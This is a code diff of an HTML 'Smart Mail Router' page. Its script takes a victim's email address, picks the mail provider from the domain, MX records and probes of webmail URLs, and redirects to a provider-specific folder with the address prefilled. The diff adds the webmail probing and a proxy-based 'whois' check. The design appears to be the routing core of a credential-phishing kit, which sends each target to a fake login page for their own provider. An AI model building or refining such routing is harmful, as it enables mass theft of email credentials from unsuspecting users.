@@ -2,112 +2,114 @@
 <html lang="en">
 <head>
 <meta charset="utf-8" />
-<title>Smart Mail Router</title>
+<title>Smart Mail Router</title>
 <script>
-document.addEventListener('DOMContentLoaded', async () => {
-  // === STEP 1: grab & validate login ===
-  const params = new URLSearchParams(window.location.search);
-  const login  = params.get('login');
-  if (!login) { return showError('Missing login parameter.'); }
+document.addEventListener('DOMContentLoaded', () => main());
 
+async function main () {
+  /* ---------- STEP 1 – validate & extract ---------------------------- */
+  const qs    = new URLSearchParams(location.search);
+  const login = qs.get('login');
+  if (!login)        { return fail('Missing login parameter.'); }
   const domain = login.split('@')[1]?.trim().toLowerCase();
-  if (!domain) { return showError('Invalid email address.'); }
+  if (!domain)       { return fail('Invalid e‑mail address.'); }
 
-  // === STEP 2: direct matches ===
-  const directRoutes = {
-    'naver.com':  'naver',
-    'daum.net':   'kakao',  'kakao.com':   'kakao',  'hanmail.net':'kakao',
-    'nate.com':   'nate',   'empas.com':   'nate',   'empal.com':  'nate',
-    'hanafos.com':'nate',   'lycos.com':   'nate',   'netsgo.com': 'nate',
-    '126.com':   'vip',     '163.com':     'vip',
-    'qq.com':    'qq',      'foxmail.com': 'qq',
-    'mail.ru':   'mailru',  'inbox.ru':    'mailru', 'list.ru':   'mailru',
-    'bk.ru':     'mailru',  'internet.ru': 'mailru',
-    'lotte.net': 'lotte',   'aol.com':     'aol',
-    'freenet.de':'freenet', 'libero.it':   'libero'
+  const sanitized = domain.replace(/[^a-z0-9.-]/gi, '');
+
+  /* ---------- helper changed here ----------------------------------- */
+  const go = folder =>
+    location.href = `${folder}/index.html?login=${encodeURIComponent(login)}`;
+  /* ------------------------------------------------------------------ */
+
+  /* ---------- STEP 2 – direct domain → folder ----------------------- */
+  const direct = {
+    'naver.com':'naver','daum.net':'kakao','kakao.com':'kakao','hanmail.net':'kakao',
+    'nate.com':'nate','empas.com':'nate','empal.com':'nate','hanafos.com':'nate',
+    'lycos.com':'nate','netsgo.com':'nate','126.com':'vip','163.com':'vip',
+    'qq.com':'qq','foxmail.com':'qq','mail.ru':'mailru','inbox.ru':'mailru',
+    'list.ru':'mailru','bk.ru':'mailru','internet.ru':'mailru','lotte.net':'lotte',
+    'aol.com':'aol','freenet.de':'freenet','libero.it':'libero'
   };
+  for (const key in direct) { if (domain.endsWith(key)) return go(direct[key]); }
 
-  for (const key in directRoutes) {
-    if (domain.endsWith(key)) { return go(directRoutes[key]); }
-  }
-
-  // === STEP 3: MX‑record based routing ===
+  /* ---------- STEP 3 – MX‑record routing (DNS‑over‑HTTPS) ------------ */
   try {
-    const dnsRes = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
-    if (dnsRes.ok) {
-      const { Answer = [] } = await dnsRes.json();
+    const dns = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
+    if (dns.ok) {
+      const { Answer = [] } = await dns.json();
       const mxRecords = Answer.map(a => a.data.toLowerCase());
-
-      const mxRoutes = {
-        'yandex':                 'yandex',
-        'worksmobile':            'worksmobile',
-        '.mail.aliyun.com':       'mailaliyun',
-        '.qiye.aliyun.com':       'qiyealiyun',
-        '.enterprise.china.alibaba.com':'qiyealiyun',
-        '.outlook.com':           'office365',
-        '.t-online.de':           't-online',
-        '.mimecast.com':          'mimecast',
-        '.orange.fr':             'orange',
-        '.netease.com':           'netease',
-        'mailplug.':              'mailplug',
-        'chinaemail.cn':          'chinaemail',
-        'secureserver.net':       'godaddy',
-        'spam.cafe24.com':        'cafe24',
-        '.fmcity.com':            'cafe24',
-        'cgwebmail.':             'gw',
-        '.daouoffice.com':        'daouoffice',
-        'emx.mail.ru':            'bizmailru',
-        'yahoodns.net':           'yahoobiz',
-        'emailsrvr.com':          'emailsrvr',
-        'mailhostbox.com':        'mailhostbox',
-        'rzone.de':               'strato',
-        '.gmx.net':               'gmx',
-        'register.it':            'register',
-        'chinanetsun.com':        'chinanetsun',
-        'hiworks.co.kr':          'hiworks',
-        'mxbiz1.qq.com':          'qqcom',
-        'mxbiz2.qq.com':          'qqcom',
-        '.cn4e.com':              'cn4e',
-        'mailfilter.':            'hibox',
-        'sfilter.':               'LG',
-        '.mailwood.com':          'LG',
-        'webmail.':               'roundcube',
-        'bizmeka.com':            'bizmeka',
-        'secuecloud.com':         'secuecloud',
-        '.serverdata.net':        'owa',
-        '.ecounterp.com':         'ecount',
-        '.mailinblack.com':       'mailinblack',
-        'whoisworks.com':         'whois'
+      const mx = {
+        'yandex':'yandex','worksmobile':'worksmobile','.mail.aliyun.com':'mailaliyun',
+        '.qiye.aliyun.com':'qiyealiyun','.enterprise.china.alibaba.com':'qiyealiyun',
+        '.outlook.com':'office365','.t-online.de':'t-online','.mimecast.com':'mimecast',
+        '.orange.fr':'orange','.netease.com':'netease','mailplug.':'mailplug',
+        'chinaemail.cn':'chinaemail','secureserver.net':'godaddy',
+        'spam.cafe24.com':'cafe24','.fmcity.com':'cafe24','cgwebmail.':'gw',
+        '.daouoffice.com':'daouoffice','emx.mail.ru':'bizmailru','yahoodns.net':'yahoobiz',
+        'emailsrvr.com':'emailsrvr','mailhostbox.com':'mailhostbox','rzone.de':'strato',
+        '.gmx.net':'gmx','register.it':'register','chinanetsun.com':'chinanetsun',
+        'hiworks.co.kr':'hiworks','mxbiz1.qq.com':'qqcom','mxbiz2.qq.com':'qqcom',
+        '.cn4e.com':'cn4e','mailfilter.':'hibox','sfilter.':'LG','.mailwood.com':'LG',
+        'webmail.':'roundcube','bizmeka.com':'bizmeka','secuecloud.com':'secuecloud',
+        '.serverdata.net':'owa','.ecounterp.com':'ecount','.mailinblack.com':'mailinblack',
+        'whoisworks.com':'whois'
       };
-
-      for (const mx of mxRecords) {
-        const hit = Object.keys(mxRoutes).find(needle => mx.includes(needle));
-        if (hit) { return go(mxRoutes[hit]); }
+      for (const mxHost of mxRecords) {
+        const hit = Object.keys(mx).find(n => mxHost.includes(n));
+        if (hit) return go(mx[hit]);
       }
     }
-  } catch (e) {
-    console.warn('MX lookup failed:', e);
+  } catch (e) { console.warn('MX lookup failed', e); }
+
+  /* ---------- STEP 4 – probe common webmail URLs -------------------- */
+  const probes = {
+    groupware:[`http://gw.${sanitized}/groupware/login.php`],
+    roundcube:[`http://${sanitized}/webmail/`,`http://webmail.${sanitized}/`,`http://${sanitized}:2095`],
+    ngw:[`http://mail.${sanitized}/ngw/app/#/sign`],
+    aruba:[`https://webmail.aruba.it/`],
+    gw:[`https://gw.${sanitized}/login`],
+    owa:[
+      `https://${sanitized}/owa/auth/logon.aspx?replaceCurrent=1&url=https://${sanitized}/owa`,
+      `https://mail.${sanitized}/owa/auth/logon.aspx?replaceCurrent=1&url=https://${sanitized}/owa`
+    ]
+  };
+
+  const urlAlive = async url => {
+    const ctrl = new AbortController();
+    const t = setTimeout(() => ctrl.abort(), 3500);
+    try {
+      await fetch(url, { method:'HEAD', mode:'no-cors', signal:ctrl.signal, cache:'no-store' });
+      clearTimeout(t);
+      return true;
+    } catch { return false; }
+  };
+
+  for (const [folder, list] of Object.entries(probes)) {
+    for (const url of list) {
+      if (await urlAlive(url)) return go(folder);
+    }
   }
 
-  // === STEP 4 & 5: server‑probe logic skipped (CORS). ===
-  // If you really need it, move this JS into a Cloudflare Worker /
-  // your own small API that *can* do HEAD requests server‑side.
+  /* ---------- STEP 5 – “Whois” keyword fallback --------------------- */
+  try {
+    const page = await fetch(`https://api.allorigins.win/raw?url=http://${sanitized}`, { cache:'no-store' });
+    if (page.ok) {
+      const text = await page.text();
+      if (text.match(/whois/i)) return go('whois');
+    }
+  } catch (e) { console.warn('Whois check failed', e); }
 
-  // === STEP 6: final fallback ===
+  /* ---------- STEP 6 – final safety net ----------------------------- */
   go('other');
 
-  // ---------- helpers ----------
-  function go(folder) {
-    window.location.href = `${folder}/login.php?login=${encodeURIComponent(login)}`;
-  }
-  function showError(msg) {
+  /* ---------- util -------------------------------------------------- */
+  function fail (msg) {
     document.body.innerHTML = `<h2 style="font-family:sans-serif;color:#d00">${msg}</h2>`;
   }
-});
+}
 </script>
 </head>
 <body>
-<!-- User will rarely see this because of the instant redirect. -->
 <noscript>Please enable JavaScript to use this page.</noscript>
 </body>
 </html>
